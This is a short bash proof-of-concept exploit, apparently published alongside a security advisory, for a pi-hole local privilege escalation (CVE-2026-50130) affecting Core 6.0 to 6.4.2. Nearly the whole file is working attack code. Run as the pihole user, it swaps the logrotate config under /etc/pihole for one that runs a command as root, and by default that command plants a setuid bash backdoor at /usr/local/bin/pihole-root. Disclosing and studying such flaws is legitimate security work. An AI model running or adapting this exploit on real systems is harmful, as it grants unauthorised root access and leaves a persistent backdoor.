#!/bin/bash
#
# LinnemanLabs - pi-hole PreStart chown logrotate PoC, pihole to root exec LPE
# CVE-2026-50130
#
# https://linnemanlabs.com/posts/pi-hole-root-with-extra-steps/
# https://github.com/linnemanlabs/advisories/
#
# https://github.com/pi-hole/pi-hole/security/advisories/GHSA-h8w9-qx2v-wrww
#
# pi-hole stored the logrotate config under /etc/pihole which is owned by the
# pihole user. replace the config, kill FTL, restart runs our code as root.
#
# run as the pihole user (ssh, FTL process, etc), executes CMD as root
# default CMD stages suid bash at /usr/local/bin/pihole-root and prints id/caps to /tmp/pi-hole-logrotate
#
# works on Core 6.0 - 6.4.2
#
CMD='install -m 4755 /bin/bash /usr/local/bin/pihole-root; id > /tmp/pi-hole-logrotate; grep -E "^Cap(Eff|Bnd)" /proc/self/status >> /tmp/pi-hole-logrotate'

set -eu
echo "[-] Moving logrotate config"
mv -f /etc/pihole/logrotate /etc/pihole/logrotate.save

echo "[-] Building logrotate config"
cat > /etc/pihole/logrotate <<EOF
/var/log/pihole/pihole.log {
    daily
    rotate 1
    postrotate
        ${CMD}
    endscript
}
EOF

echo "[-] chmod'ing logrotate config"
chmod 600 /etc/pihole/logrotate

echo "[+] done. next FTL restart will chown, the next logrotate after will execute our code"
